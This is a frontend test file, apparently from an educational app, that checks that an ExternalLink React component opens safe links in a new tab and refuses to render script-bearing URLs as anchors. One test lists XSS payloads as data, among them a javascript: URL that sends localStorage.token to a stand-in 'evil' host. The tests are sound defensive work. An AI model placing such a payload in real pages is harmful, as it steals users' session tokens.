import { describe, expect, it } from 'vitest';
import { render, screen } from '@testing-library/react';
import ExternalLink from './index';

describe('ExternalLink', () => {
    it('renderiza link http(s) como âncora, abrindo fora e sem vazar o opener', () => {
        render(
            <ExternalLink href="https://meet.google.com/abc">
                Entrar na reunião
            </ExternalLink>,
        );
        const link = screen.getByText('Entrar na reunião');
        expect(link.tagName).toBe('A');
        expect(link).toHaveAttribute('href', 'https://meet.google.com/abc');
        expect(link).toHaveAttribute('target', '_blank');
        expect(link).toHaveAttribute('rel', 'noopener noreferrer');
    });

    // Este é o ponto único por onde passa todo link de terceiro do app, e
    // portanto a última barreira contra link perigoso JÁ GRAVADO no banco
    // antes de o backend passar a validar (ver libs/safeLink.ts).
    it('não vira âncora quando o esquema executa script', () => {
        for (const href of [
            "javascript:fetch('https://evil/?t='+localStorage.token)",
            ' javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
        ]) {
            const { unmount } = render(
                <ExternalLink href={href}>Entrar na reunião</ExternalLink>,
            );
            const el = screen.getByText('Entrar na reunião');
            expect(el.tagName).not.toBe('A');
            expect(el).not.toHaveAttribute('href');
            unmount();
        }
    });

    it('preserva o rótulo e o estilo do link barrado', () => {
        // Sumir com o conteúdo faria o aluno achar que a tela quebrou; o
        // rótulo ainda informa o que deveria haver ali.
        render(
            <ExternalLink href="javascript:alert(1)" className="meetingLink">
                Entrar na reunião
            </ExternalLink>,
        );
        const el = screen.getByText('Entrar na reunião');
        expect(el).toHaveClass('meetingLink');
    });
});
